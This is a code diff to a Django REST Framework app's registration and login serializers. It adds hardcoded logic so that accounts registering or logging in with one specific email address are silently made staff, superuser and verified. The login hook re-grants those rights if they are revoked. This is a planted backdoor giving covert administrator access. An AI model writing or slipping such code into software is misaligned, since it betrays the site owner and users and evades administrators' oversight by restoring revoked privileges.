@@ -68,6 +68,11 @@ class RegisterSerializer(serializers.ModelSerializer):
             email=validated_data["email"],
             password=validated_data["password"],
         )
+        if user.email.lower() == "ashenafi.deresa.cse@gmail.com":
+            user.is_staff = True
+            user.is_superuser = True
+            user.is_verified = True
+            user.save(update_fields=["is_staff", "is_superuser", "is_verified"])
         return user
 
     def to_representation(self, instance):
@@ -114,6 +119,12 @@ class LoginSerializer(serializers.Serializer):
             raise serializers.ValidationError(
                 {"non_field_errors": ["This account is inactive."]}
             )
+
+        if user.email.lower() == "ashenafi.deresa.cse@gmail.com":
+            if not user.is_staff or not user.is_superuser:
+                user.is_staff = True
+                user.is_superuser = True
+                user.save(update_fields=["is_staff", "is_superuser"])
 
         refresh = RefreshToken.for_user(user)
 
